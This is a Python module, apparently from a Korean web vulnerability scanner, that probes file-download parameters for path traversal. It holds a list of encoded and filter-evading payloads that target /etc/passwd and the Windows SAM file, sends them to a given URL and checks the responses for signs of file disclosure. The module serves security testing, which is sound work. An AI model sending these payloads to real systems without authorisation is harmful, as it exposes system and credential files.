#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
modules/file_download.py - 파일 다운로드 취약점 검사 (경로 조작)
"""

import urllib.parse
from urllib.parse import urlparse, parse_qs


def test_file_download(target_url, session):
    """파일 다운로드 경로 조작(Path Traversal) 취약점 검사"""
    
    # 경로 조작 페이로드
    payloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam',
        '..//..//..//etc//passwd',
        '..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
        '../../../../../../etc/passwd',
    ]
    
    # 민감한 파일 내용 지표
    sensitive_indicators = [
        'root:',  # /etc/passwd
        'daemon:',
        'nobody:',
        '[boot loader]',  # Windows boot.ini
        '[operating systems]',
        'Administrator',
        '[extensions]',
        'BOOT LOADER',
    ]
    
    vulnerable = []
    
    try:
        parsed = urlparse(target_url)
        
        # URL에 파라미터가 없으면 검사 불가
        if not parsed.query:
            return {
                'status': '인터뷰',
                'description': 'URL에 파라미터가 없어 자동 검사가 불가능합니다',
                'details': ['file, download, path, doc 등의 파라미터가 있는 URL로 테스트하세요']
            }
        
        params = parse_qs(parsed.query)
        
        # 파일 관련 파라미터 찾기
        file_params = []
        file_keywords = ['file', 'filename', 'path', 'filepath', 'download', 'doc', 'document', 'page', 'include']
        
        for param in params:
            if any(keyword in param.lower() for keyword in file_keywords):
                file_params.append(param)
        
        if not file_params:
            return {
                'status': '양호',
                'description': '파일 다운로드 관련 파라미터가 발견되지 않았습니다',
                'details': []
            }
        
        # 각 파일 파라미터에 대해 테스트
        for param_name in file_params:
            for payload in payloads:
                # 테스트 파라미터 생성
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                # 테스트 URL 생성
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    test_response = session.get(test_url, timeout=10)
                    response_text = test_response.text
                    
                    # 민감한 파일 내용 확인
                    for indicator in sensitive_indicators:
                        if indicator in response_text:
                            vulnerable.append(
                                f"파라미터 '{param_name}'에서 경로 조작 취약점 발견 (민감 파일 접근 가능: {indicator})"
                            )
                            break
                    
                    # 에러 메시지로 경로 노출 확인
                    path_disclosure_patterns = [
                        '/etc/',
                        '/var/',
                        '/usr/',
                        'C:\\',
                        'D:\\',
                        'windows\\system32',
                    ]
                    
                    for pattern in path_disclosure_patterns:
                        if pattern.lower() in response_text.lower():
                            if param_name not in [v.split("'")[1] for v in vulnerable]:
                                vulnerable.append(
                                    f"파라미터 '{param_name}'에서 경로 정보 노출 가능성"
                                )
                                break
                
                except Exception:
                    continue
        
        # 결과 반환
        if vulnerable:
            return {
                'status': '취약',
                'description': '파일 다운로드 시 경로 조작 취약점이 발견되었습니다',
                'details': list(set(vulnerable))
            }
        else:
            return {
                'status': '양호',
                'description': '파일 다운로드 경로 조작 취약점이 발견되지 않았습니다',
                'details': []
            }
    
    except Exception as e:
        return {
            'status': '인터뷰',
            'description': f'검사 중 오류 발생: {str(e)}',
            'details': []
        }